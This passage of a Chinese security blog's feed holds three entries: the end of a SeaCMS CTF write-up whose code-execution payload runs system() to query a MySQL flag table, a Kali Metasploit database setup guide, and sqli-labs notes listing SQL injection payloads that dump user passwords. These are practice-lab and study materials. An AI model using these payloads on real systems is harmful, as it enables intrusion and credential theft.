seacms.flag_140ad2e0d8cb&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(48) &quot;flag flag&#123;2bb5a914-8009-476d-b90f-a0fac75d8567&#125; &quot;</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525536396139.png" alt="1525536396139"></p><p>方法二</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;mysql -usea_user -p46e06533407e -e &apos;select *from seacms.flag_140ad2e0d8cb&apos;&quot;);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525538437040.png" alt="1525538437040"></p><p>方法三</p><p>直接绕过貌似比较难，于是先将payload使用base6编码。用两个eval绕过waf的拦截。最后构造的payload如下: </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1520932927_813979.jpg" alt="img"> </p><p>方法四</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537606003.png" alt="1525537606003"></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">Seacms漏洞分析利用复现 By Assassin</a> </p><p><a href="https://www.ichunqiu.com/writeup/detail/1159" target="_blank" rel="noopener">“百度杯”CTF比赛 九月场Test</a></p><p><a href="https://www.ichunqiu.com/writeup/detail/365" target="_blank" rel="noopener">海洋cms前台直接GetShell</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;百度杯-九月场-Test&quot;&gt;&lt;a href=&quot;#百度杯-九月场-Test&quot; class=&quot;headerlink&quot; title=&quot;百度杯  九月场 Test&quot;&gt;&lt;/a&gt;百度杯  九月场 Test&lt;/h3&gt;&lt;hr&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>kali 2.0下安装 metasploit</title>
    <link href="http://blog.Lhaihai.wang/2018/05/05/2-0%E4%B8%8B%E5%AE%89%E8%A3%85metasploit/"/>
    <id>http://blog.Lhaihai.wang/2018/05/05/2-0下安装metasploit/</id>
    <published>2018-05-05T14:34:21.000Z</published>
    <updated>2018-05-05T15:14:24.862Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="noopener">github地址</a></p><p>第一步:kali linux 2.0 本身已内置metasploit，kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。</p><p>在kali 2.0中启动带数据库支持的msf方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1  首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；</span><br><span class="line">#2  初始化MSF数据库（关键步骤！）：msfdb init；</span><br><span class="line">#3  运行msfconsole：msfconsole；</span><br><span class="line">#4  在msf中查看数据库连接状态：db_status。</span><br><span class="line">DONE</span><br><span class="line">db_rebuild_cache</span><br></pre></td></tr></table></figure><p>过程如下</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service metasploit start</span><br><span class="line">Failed to start metasploit.service: Unit metasploit.service not found.</span><br><span class="line">root@kali:~# service postgresql start</span><br><span class="line">root@kali:~# msfdb init</span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &apos;msf&apos;</span><br><span class="line">[+] Creating databases &apos;msf&apos;</span><br><span class="line">[+] Creating databases &apos;msf_test&apos;</span><br><span class="line">[+] Creating configuration file &apos;/usr/share/metasploit-framework/config/database.yml&apos;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">root@kali:~# msfconsole</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.16.52-dev                         ]</span><br><span class="line">+ -- --=[ 1754 exploits - 1006 auxiliary - 306 post       ]</span><br><span class="line">+ -- --=[ 536 payloads - 41 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf</span><br><span class="line">msf &gt; DONE</span><br><span class="line">[-] Unknown command: DONE.</span><br><span class="line">msf &gt; db_rebuild_cache </span><br><span class="line">[*] Purging and rebuilding the module cache in the background...</span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    history       Show command history</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    edit          Edit the current module or a file with the preferred editor</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    reload_lib    Load a library file from specified path</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    use           Selects a module by name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Job Commands</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    handler       Start a payload handler as job</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Resource Script Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Credentials Backend Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    creds         List all credentials in the database</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第一步:kali linux 2.0 本身已内置metasploit，kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。&lt;/p&gt;
&lt;p&gt;在kali 2.0中启动带数据库支持的msf方式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#1  首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#2  初始化MSF数据库（关键步骤！）：msfdb init；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#3  运行msfconsole：msfconsole；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#4  在msf中查看数据库连接状态：db_status。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DONE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;db_rebuild_cache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;过程如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="kali linux" scheme="http://blog.Lhaihai.wang/tags/kali-linux/"/>
    
  </entry>
  
  <entry>
    <title>sql_labs学习记录（1）</title>
    <link href="http://blog.Lhaihai.wang/2018/05/05/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89/"/>
    <id>http://blog.Lhaihai.wang/2018/05/05/sql-labs学习记录（1）/</id>
    <published>2018-05-05T01:52:11.000Z</published>
    <updated>2018-05-06T06:49:29.272Z</updated>
    
    <content type="html"><![CDATA[<h3 id="less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485324116.png" alt="1525485324116"></p><p>不选择数据库的话它会把很多个users表的字段爆出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&apos;users&apos; -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485367696.png" alt="1525485367696"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487548474.png" alt="1525487548474"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(concat_ws(&apos;_&apos;,id,username,password)) ,3 from users -- +</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487267862.png" alt="1525487267862"></p><h3 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2  GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2  GET - Error based - Intiger based (基于错误的GET整型注入)</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- </span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- </span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less-2/?</span><br><span class="line">id=-1 union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) ,3 from users --</span><br></pre></td></tr></table></figure><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less 3  GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less 3  GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/</span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(database(),version()),3 -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()  -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &apos;users&apos; and table_schema = database()  -- +</span><br><span class="line"></span><br><span class="line">?id=1.1&apos;)  union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- +</span><br></pre></td></tr></table></figure><h3 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4  GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4  GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1.1&quot;)  union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- +</span><br></pre></td></tr></table></figure><h3 id="less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23  </span><br><span class="line"></span><br><span class="line">查表</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 3, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 1, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 2, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 </span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">?id=1&apos; union select count(*),count(*), concat((select username from users  limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h3 id="less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select count(*),count(*), concat((select username from users  limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h3 id="less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="less 7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>less 7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><p>参考链接:</p><p><a href="https://blog.csdn.net/u012763794/article/details/51207833#t6" target="_blank" rel="noopener">通过sqli-labs学习sql注入——基础挑战之less1-10</a> </p><p><a href="https://blog.csdn.net/csu_vc/article/details/78150247" target="_blank" rel="noopener">sqli-labs学习记录（三）</a> </p><p><a href="https://blog.csdn.net/csu_vc/article/details/78165936" target="_blank" rel="noopener">sqli-labs学习记录（四）</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入&quot;&gt;&lt;a href=&quot;#less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入&quot; class=&quot;headerlink&quot; title=&quot;less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)&quot;&gt;&lt;/a&gt;less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485324116.png&quot; alt=&quot;1525485324116&quot;&gt;&lt;/p&gt;
&lt;p&gt;不选择数据库的话它会把很多个users表的字段爆出来&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&amp;apos;users&amp;apos; -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525485367696.png&quot; alt=&quot;1525485367696&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sqli-labs-master/Less-1/?id=15&amp;apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_schema=&amp;apos;security&amp;apos; and table_name=&amp;apos;users&amp;apos; -- +&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/sql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89.assets/1525487548474.png&quot; alt=&quot;1525487548474&quot;&gt;&lt;/p&gt;
